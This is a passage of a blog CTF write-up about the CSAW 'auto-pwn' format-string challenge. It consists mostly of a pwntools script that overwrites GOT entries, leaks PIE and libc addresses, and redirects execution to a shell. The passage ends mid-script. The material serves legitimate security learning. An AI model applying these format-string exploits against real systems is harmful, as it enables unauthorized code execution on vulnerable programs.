<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="no-referrer-when-downgrade">

    <title>Procrastination Simulator</title>
    <meta name="description" content="">

    <link rel="stylesheet" href="https://tsheinen.github.io/main.css">
    
    

    <style>
        
        [data-theme="Dark"] {   
            --background-color: #2D283E;
            --background-alt-color: #36304B;
            --highlight-color: #DEC1FF;
            --highlight-color-alt: #ED254E;
            --foreground-color: #D1D7E0;
        }
        
        [data-theme="Light"] {   
            --background-color: #E0F5CC;
            --background-alt-color: #EAF8DD;
            --highlight-color: #D8315B;
            --highlight-color-alt: #0197F6;
            --foreground-color: #3B413C;
        }
        
    </style>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.4.0/dist/confetti.browser.min.js"></script>
    
    
</head>
<body data-theme="dark">
    <script defer>

        function setTheme(theme) {
            document.body.dataset['theme'] = theme;
            localStorage.setItem('theme', theme);
        }
        window.addEventListener('storage', function(event){
            if (event.storageArea === localStorage && event.key === "theme") {
                setTheme(event.newValue);
            }
        }, false);
        setTheme(localStorage.getItem('theme') || 'dark');
        setTimeout(() => window.document.body.classList.add("transition"), 300);
    </script>
    <a class="skip-main" href="#main">Skip to content</a>
    <div class="container">
        <header> 
            <h1 class="site-header">
                <a href="https:&#x2F;&#x2F;tsheinen.github.io">Teddy Heinen</a>
            </h1>
            <nav>
                
                
                
                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;about&#x2F;">About</a>
                
                
                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;tags&#x2F;">Tags</a>
                
<!--                 <div class="search-container">
                    <input id="search" type="search" placeholder="🧐 Search!">

                    <div class="search-results">
                        <div class="search-results__items"></div>
                    </div>
                </div> -->
                
            </nav>
        </header>
        <main id="main" tabindex="-1">
            


<nav class="toc">
  <ul>
  
  </ul>
  <svg class="toc-marker" width="200" height="200" xmlns="http://www.w3.org/2000/svg">
    <path stroke="#444" stroke-width="3" fill="transparent" stroke-dasharray="0, 0, 0, 1000" stroke-linecap="round" stroke-linejoin="round" transform="translate(-0.5, -0.5)" />
  </svg>
</nav>

<article class="post">
    <header>
        <h1>Procrastination Simulator</h1>
    </header>

    <div class="content">
        <pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>Oh noes! I partied all weekend and now it&#39;s an hour before the CTF ends and I have school deadlines tonight too. Can you help me write 60 reports and pwn 50 challenges by Sunday afternoon? nc auto-pwn.chal.csaw.io 11001 with password cd80d3cd8a479a18bbc9652f3631c61c
</span></code></pre>
<p>This was an automatic exploit generation challenge; there were four binary classes spread across 50 levels. Each binary was vulnerable to a format string exploit, with more and more mitigations as they got harder.</p>
<ol>
<li>32-bit; No PIE; Win function to shell. Overwrite GOT for exit to win function</li>
<li>64-bit; No PIE; Win function to shell. Overwrite GOT for exit to win function but had to construct the payload a little different bc of null bytes in 64-bit addresses.</li>
<li>64-bit; No PIE; Win function to shell; Stripped symbols so we had to locate the win function by searching for a string of bytes.</li>
<li>64-bit; PIE; No win function; We get three payloads. I leaked the program base and libc bases off the stack, overwrote GOT memset with system, and then passed "/bin/sh" for the last time -- calling system("/bin/sh").</li>
</ol>
<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">#!/usr/bin/env python3
</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
</span><span style="color:#ffa759;">import </span><span>os
</span><span style="color:#ffa759;">import </span><span>re
</span><span>context</span><span style="color:#f29e74;">.</span><span>terminal </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;kitty&quot;
</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">exploit_1</span><span>(</span><span style="color:#ffcc66;">port</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">password</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">shell</span><span>):
</span><span>    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;auto-pwn.chal.csaw.io&quot;</span><span style="color:#ccc9c2cc;">, </span><span>port)
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(password)
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;---</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)
</span><span>    binary </span><span style="color:#f29e74;">= </span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;-------------------</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">rstrip</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">replace</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;-------------------------------------------------------------------&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;&quot;</span><span>)
</span><span>    </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;binary.hex&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;wb&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span>(binary)
</span><span>    os</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">system</span><span>(</span><span style="color:#bae67e;">&quot;xxd -rp binary.hex &gt; binary&quot;</span><span>)
</span><span>    exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;binary&quot;</span><span>)
</span><span>    lower </span><span style="color:#f29e74;">= </span><span>(exe</span><span style="color:#f29e74;">.</span><span>sym[</span><span style="color:#bae67e;">&#39;win&#39;</span><span>] </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">10</span><span>) </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0xffff
</span><span>    upper </span><span style="color:#f29e74;">= </span><span>exe</span><span style="color:#f29e74;">.</span><span>sym[</span><span style="color:#bae67e;">&#39;win&#39;</span><span>] </span><span style="color:#f29e74;">&gt;&gt; </span><span style="color:#ffcc66;">16
</span><span>    payload </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">flat</span><span>([
</span><span>        </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;BB&quot;</span><span style="color:#ccc9c2cc;">,
</span><span>        </span><span style="color:#ffd580;">p32</span><span>(exe</span><span style="color:#f29e74;">.</span><span>got[</span><span style="color:#bae67e;">&#39;exit&#39;</span><span>])</span><span style="color:#ccc9c2cc;">,
</span><span>        </span><span style="color:#ffd580;">p32</span><span>(exe</span><span style="color:#f29e74;">.</span><span>got[</span><span style="color:#bae67e;">&#39;exit&#39;</span><span>]</span><span style="color:#f29e74;">+</span><span style="color:#ffcc66;">2</span><span>)</span><span style="color:#ccc9c2cc;">,
</span><span>        </span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;%</span><span>{lower}</span><span style="color:#bae67e;">c&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>()</span><span style="color:#ccc9c2cc;">,
</span><span>        </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;%6$hn&quot;</span><span style="color:#ccc9c2cc;">,
</span><span>    ])
</span><span>    </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;payload.bin&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;wb&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span>(password </span><span style="color:#f29e74;">+ </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot; </span><span style="color:#f29e74;">+ </span><span>payload)
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(payload)
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&quot;cat message.txt;ls;exit&quot;</span><span>)
</span><span>    </span><span style="color:#ffa759;">if </span><span>shell:
</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;flag is in another box! &quot;</span><span>)
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># print()
</span><span>    message </span><span style="color:#f29e74;">= </span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>()
</span><span>    </span><span style="color:#f28779;">print</span><span>(message)
</span><span>    searched </span><span style="color:#f29e74;">= </span><span>re</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#bae67e;">&quot;auto-pwn.chal.csaw.io ([0-9]*) and use password (.*)&quot;</span><span style="color:#ccc9c2cc;">, </span><span>message)
</span><span>    </span><span style="color:#ffa759;">if </span><span>shell:
</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">close</span><span>()
</span><span>    </span><span style="color:#ffa759;">return </span><span>(</span><span style="font-style:italic;color:#5ccfe6;">int</span><span>(searched</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">1</span><span>))</span><span style="color:#ccc9c2cc;">, </span><span>searched</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">2</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>())
</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">exploit_2</span><span>(</span><span style="color:#ffcc66;">port</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">password</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">shell</span><span>):
</span><span>    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;auto-pwn.chal.csaw.io&quot;</span><span style="color:#ccc9c2cc;">, </span><span>port)
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(password)
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;---</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)
</span><span>    binary </span><span style="color:#f29e74;">= </span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;-------------------</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">rstrip</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">replace</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;-------------------------------------------------------------------&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;&quot;</span><span>)
</span><span>    </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;binary.hex&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;wb&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span>(binary)
</span><span>    os</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">system</span><span>(</span><span style="color:#bae67e;">&quot;xxd -rp binary.hex &gt; binary&quot;</span><span>)
</span><span>    exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;binary&quot;</span><span>)
</span><span>    lower </span><span style="color:#f29e74;">= </span><span>(exe</span><span style="color:#f29e74;">.</span><span>sym[</span><span style="color:#bae67e;">&#39;win&#39;</span><span>] </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">10</span><span>) </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0xffff
</span><span>    upper </span><span style="color:#f29e74;">= </span><span>exe</span><span style="color:#f29e74;">.</span><span>sym[</span><span style="color:#bae67e;">&#39;win&#39;</span><span>] </span><span style="color:#f29e74;">&gt;&gt; </span><span style="color:#ffcc66;">16
</span><span>    payload </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">flat</span><span>([
</span><span>        </span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;%</span><span>{exe</span><span style="color:#f29e74;">.</span><span>sym[</span><span style="color:#bae67e;">&#39;win&#39;</span><span>] </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0xffff</span><span>}</span><span style="color:#bae67e;">c&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>()</span><span style="color:#ccc9c2cc;">,
</span><span>        </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;C&quot; </span><span style="color:#f29e74;">* </span><span>(</span><span style="color:#ffcc66;">8 </span><span style="color:#f29e74;">- </span><span style="color:#f28779;">len</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">str</span><span>(exe</span><span style="color:#f29e74;">.</span><span>sym[</span><span style="color:#bae67e;">&#39;win&#39;</span><span>] </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0xffff</span><span>)) </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span>) </span><span style="color:#ccc9c2cc;">,
</span><span>        </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;%8$hn&quot;</span><span style="color:#ccc9c2cc;">,
</span><span>        </span><span style="color:#ffd580;">p64</span><span>(exe</span><span style="color:#f29e74;">.</span><span>got[</span><span style="color:#bae67e;">&#39;exit&#39;</span><span>])</span><span style="color:#ccc9c2cc;">,
</span><span>    ])
</span><span>    </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;payload.bin&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;wb&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span>(password </span><span style="color:#f29e74;">+ </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot; </span><span style="color:#f29e74;">+ </span><span>payload)
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(payload)
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&quot;cat message.txt;ls;exit&quot;</span><span>)
</span><span>    </span><span style="color:#ffa759;">if </span><span>shell:
</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;flag is in another box! &quot;</span><span>)
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># print()
</span><span>    message </span><span style="color:#f29e74;">= </span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>()
</span><span>    </span><span style="color:#f28779;">print</span><span>(message)
</span><span>    searched </span><span style="color:#f29e74;">= </span><span>re</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#bae67e;">&quot;auto-pwn.chal.csaw.io ([0-9]*) and use password (.*)&quot;</span><span style="color:#ccc9c2cc;">, </span><span>message)
</span><span>    </span><span style="color:#ffa759;">if </span><span>shell:
</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">close</span><span>()
</span><span>    </span><span style="color:#ffa759;">return </span><span>(</span><span style="font-style:italic;color:#5ccfe6;">int</span><span>(searched</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">1</span><span>))</span><span style="color:#ccc9c2cc;">, </span><span>searched</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">2</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>())
</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">exploit_3</span><span>(</span><span style="color:#ffcc66;">port</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">password</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">shell</span><span>):
</span><span>    </span><span style="color:#ffa759;">from </span><span>binascii </span><span style="color:#ffa759;">import </span><span>unhexlify
</span><span>    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;auto-pwn.chal.csaw.io&quot;</span><span style="color:#ccc9c2cc;">, </span><span>port)
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># r = process(&quot;./binary&quot;)
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(password)
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;---</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)
</span><span>    binary </span><span style="color:#f29e74;">= </span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;-------------------</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">rstrip</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">replace</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;-------------------------------------------------------------------&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;&quot;</span><span>)
</span><span>    </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;binary.hex&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;wb&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span>(binary)
</span><span>    os</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">system</span><span>(</span><span style="color:#bae67e;">&quot;xxd -rp binary.hex &gt; binary&quot;</span><span>)
</span><span>    exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;binary&quot;</span><span>)
</span><span>    win </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">next</span><span>(exe</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#ffd580;">unhexlify</span><span>(</span><span style="color:#bae67e;">&quot;f30f1efa554889e5488d&quot;</span><span>)))
</span><span>    payload </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">flat</span><span>([
</span><span>        </span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;%</span><span>{win </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0xffff</span><span>}</span><span style="color:#bae67e;">c&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>()</span><span style="color:#ccc9c2cc;">,
</span><span>        </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;C&quot; </span><span style="color:#f29e74;">* </span><span>(</span><span style="color:#ffcc66;">8 </span><span style="color:#f29e74;">- </span><span style="color:#f28779;">len</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">str</span><span>(win </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0xffff</span><span>)) </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span>) </span><span style="color:#ccc9c2cc;">,
</span><span>        </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;%8$hn&quot;</span><span style="color:#ccc9c2cc;">,
</span><span>        </span><span style="color:#ffd580;">p64</span><span>(exe</span><span style="color:#f29e74;">.</span><span>got[</span><span style="color:#bae67e;">&#39;exit&#39;</span><span>])</span><span style="color:#ccc9c2cc;">,
</span><span>    ])
</span><span>    </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;payload.bin&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;wb&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span>(password </span><span style="color:#f29e74;">+ </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot; </span><span style="color:#f29e74;">+ </span><span>payload)
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(payload)
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&quot;cat message.txt;ls;exit&quot;</span><span>)
</span><span>    </span><span style="color:#ffa759;">if </span><span>shell:
</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;flag is in another box! &quot;</span><span>)
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># print()
</span><span>    message </span><span style="color:#f29e74;">= </span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>()
</span><span>    </span><span style="color:#f28779;">print</span><span>(message)
</span><span>    searched </span><span style="color:#f29e74;">= </span><span>re</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#bae67e;">&quot;auto-pwn.chal.csaw.io ([0-9]*) and use password (.*)&quot;</span><span style="color:#ccc9c2cc;">, </span><span>message)
</span><span>    </span><span style="color:#ffa759;">if </span><span>shell:
</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">close</span><span>()
</span><span>    </span><span style="color:#ffa759;">return </span><span>(</span><span style="font-style:italic;color:#5ccfe6;">int</span><span>(searched</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">1</span><span>))</span><span style="color:#ccc9c2cc;">, </span><span>searched</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">2</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span>())
</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">exploit_4</span><span>(</span><span style="color:#ffcc66;">port</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">password</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">shell</span><span>):
</span><span>    </span><span style="color:#ffa759;">from </span><span>binascii </span><span style="color:#ffa759;">import </span><span>unhexlify
</span><span>    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;auto-pwn.chal.csaw.io&quot;</span><span style="color:#ccc9c2cc;">, </span><span>port)
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># r = gdb.debug(&quot;./binary&quot;,gdbscript=&quot;b fgets\nc&quot;)
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(password)
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;---</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)
</span><span>    binary </span><span style="color:#f29e74;">= </span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;-------------------</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">rstrip</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">replace</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;-------------------------------------------------------------------&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;&quot;</span><span>)
</span><span>    </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;binary.hex&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;wb&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span>(binary)
</span><span>    os</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">system</span><span>(</span><span style="color:#bae67e;">&quot;xxd -rp binary.hex &gt; binary&quot;</span><span>)
</span><span>    </span><span style="font-style:italic;color:#5c6773;"># r.interactive()
</span><span>    exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;binary&quot;</span><span>)
</span><span>    payload </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;%7$lx.%45$lx&quot;
</span><span>    f </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;payload.bin&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;wb&quot;</span><span>)
</span><span>    f</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span>(password </span><span style="color:#f29e74;">+ </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot; </span><span style="color:#f29e74;">+ </span><span>payload)
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(payload)
</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;Report 1:</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)
</span><span>    prog, libc </span><span style="color:#f29e74;">= </span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">split</span><span>(</span><span style="color:#bae67e;">&quot;.&quot;</span><span>)
</span><span>    program_base, libc_base </span><span style="color:#f29e74;">= </span><span>(</span><span style="font-style:italic;color:#5ccfe6;">int</span><span>(prog</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">16</span><span>) </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">0x374c</span><span style="color:#ccc9c2cc;">, </span><span style="font-style:italic;color:#5ccfe6;">int</span><span>(libc</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">16</span><span>) </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">0x270b3</span><span>)
</span><span>    memset_got </span><span style="color:#f29e74;">= </span><span>program_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x36b8
</span><span>    system_addr </span><span style="color:#f29e74;">= </span><span>libc_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x55410
</span><span>    free_hook </span><span style="color:#f29e74;">= </span><span>libc_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x000000000039b788
</span><span>    one_gadget </span><span style="color:#f29e74;">= </span><span>libc_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x3f35a
</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;program base: </span><span>{</span><span style="color:#f28779;">hex</span><span>(program_base)}</span><span style="color:#bae67e;">, libc base: </span><span>{</span><span style="color:#f28779;">hex</span><span>(libc_base)}</span><span style="color:#bae67e;">&quot;</span><span>)
</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;memset_got: </span><span>{</span><span style="color:#f28779;">hex</span><span>(memset_got)}</span><span style="color:#bae67e;">, system_addr: </span><span>{</span><span style="color:#f28779;">hex</span><span>(system_addr)}</span><span style="color:#bae67e;">&quot;</span><span>)
</span><span>    context</span><span style="color:#f29e74;">.</span><span>bits </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">64
